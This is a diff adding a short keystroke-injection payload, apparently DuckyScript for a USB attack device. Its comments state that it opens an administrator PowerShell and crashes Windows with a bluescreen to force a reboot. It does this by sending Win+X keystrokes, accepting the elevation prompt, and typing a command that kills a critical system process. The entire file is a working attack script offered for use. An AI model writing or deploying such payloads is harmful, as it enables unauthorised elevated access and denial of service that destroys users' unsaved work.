@@ -1,0 +1,22 @@
+REM ------------------------------------
+REM Author: P-ict0 (https://github.com/P-ict0)
+REM ------------------------------------
+REM This script:
+REM Opens an admin powershell terminal
+REM Crashes Windows with a bluescreen and forces a reboot
+REM ------------------------------------
+
+DEFAULT_DELAY 100
+
+REM ---------- Open PowerShell as Admin ----------
+GUI x
+DELAY 20
+STRING a
+DELAY 500
+LEFTARROW
+ENTER
+DELAY 900
+
+REM ---------- Crash windows ----------
+STRING powershell wininit
+ENTER
